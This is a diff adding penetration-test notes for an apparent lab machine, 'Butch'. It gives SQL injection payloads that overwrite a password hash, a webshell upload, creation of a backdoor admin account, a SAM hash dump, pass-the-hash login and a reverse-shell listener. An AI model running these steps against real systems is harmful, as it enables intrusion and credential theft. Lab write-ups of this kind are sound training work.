@@ -1,0 +1,100 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.190.63 > Butch.txt
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+25/tcp   open  smtp          Microsoft ESMTP 10.0.17763.1
+| smtp-commands: butch Hello [192.168.45.246], TURN, SIZE 2097152, ETRN, PIPELINING, DSN, ENHANCEDSTATUSCODES, 8bitmime, BINARYMIME, CHUNKING, VRFY, OK
+|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH TURN ETRN BDAT VRFY
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+450/tcp  open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Butch
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: Host: butch; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-07-07T06:01:12
+|_  start_date: N/A
+
+http://192.168.190.63:450/
+# test SQLi and confirm tablename and column names
+' UNION SELECT username, password_hash from users--
+
+'; IF (3=(SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users')) WAITFOR DELAY '0:0:10' --
+
+'; IF (1=(SELECT COUNT(*) FROM users)) WAITFOR DELAY '0:0:4' --
+'; IF (1=(SELECT COUNT(*) FROM users where username='butch')) WAITFOR DELAY '0:0:4' -- 
+# Confirm table name users and username butch
+
+The default password hashing algorithm for ASP.NET 10 (via ASP.NET Core Identity) is PBKDF2 with HMAC-SHA512
+
+$ echo -n 'butch' | sha256sum
+48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0
+
+'; update users set password_hash='48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0' where username = 'butch'; --
+
+'; update users set password_hash='141714383b1614e77057017a9d38eaf033724353a1d9a8c25cbf57566faf51cd' where username = 'butch'; --
+
+# Then can use to login butch:butch, and found file uploader.
+# https://github.com/yangbaopeng/ashx_webshell/blob/master/shell.ashx
+
+http://192.168.190.63:450/shell.ashx?cmd=whoami
+nt authority\system
+# confirm that webserver run by nt authority\system. Fail to get reverse shell, but can use administrator privilege to dump SAM SYSTEM, add new user to download it back to kali
+
+net user /add test Password1
+net localgroup administrators test /add
+net localgroup "Remote Management Users" test /add
+reg save hklm\sam C:\temp\SAM
+reg save hklm\system C:\temp\SYSTEM
+
+test:Password1
+
+$ nxc winrm 192.168.190.63 -u test -p Password1
+WINRM       192.168.190.63  5985   BUTCH            [+] butch\test:Password1 (Pwn3d!)
+Download SAM and SYSTEM
+
+$ impacket-secretsdump -sam SAM -system SYSTEM local                   
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xdf5f12a525884aa06c202557ed97f451
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:22f8dd43b690991d960c1495a22aa5b6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04d89b85cceff68a0dfe63b6fc6ef22d:::
+butch:1001:aad3b435b51404eeaad3b435b51404ee:11a10a8a1684dcf0f9dd71f0766e602d:::
+test:1002:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+[*] Cleaning up...
+
+$ evil-winrm -i 192.168.190.63 -u Administrator -H '22f8dd43b690991d960c1495a22aa5b6'
+
+
+##########################################################################
+http://192.168.190.63:450/dev/site.master.txt
+<%@ Language="C#" src="site.master.cs" Inherits="MyNamespaceMaster.MyClassMaster" %>
+# Above info shows that how the website works.
+# https://github.com/autofac/Examples/blob/main/src/WebFormsExample/Site.Master.cs
+# merge reverse shell code to above site.master.cs tample. then upload to http://192.168.190.63:450/repo.aspx
+
+$ rlwrap nc -nlvp 445
+listening on [any] 445 ...
+connect to [192.168.45.246] from (UNKNOWN) [192.168.190.63] 49738
+Microsoft Windows [Version 10.0.17763.1217]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+nt authority\system
+
